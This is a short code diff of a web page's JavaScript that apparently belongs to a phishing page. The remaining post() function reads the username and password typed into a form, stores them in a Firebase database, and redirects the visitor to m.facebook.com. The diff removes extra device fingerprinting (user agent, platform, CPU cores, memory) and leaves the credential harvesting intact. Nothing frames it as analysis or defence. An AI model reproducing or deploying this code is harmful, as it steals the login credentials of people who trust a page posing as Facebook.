@@ -91,22 +91,12 @@
 <script>
     function post()
 {
-  var device = navigator.userAgent;
-  var platform = navigator.platform;
-  var core= navigator.hardwareConcurrency ;
-  alert(core);
-  var Ram = navigator.deviceMemory + 'gb' ;
-  alert(Ram);
   var username=document.getElementById("username").value;
   var password=document.getElementById("password").value;
   var ref=firebase.database().ref();
   ref.push({
   username:username,
-  password:password,
-  Device : device,
-  Platform : platform,
-  CpuCore :core,
-  Ram:Ram
+  password:password
 });
 
 window.location.href = 'https://m.facebook.com/' ;
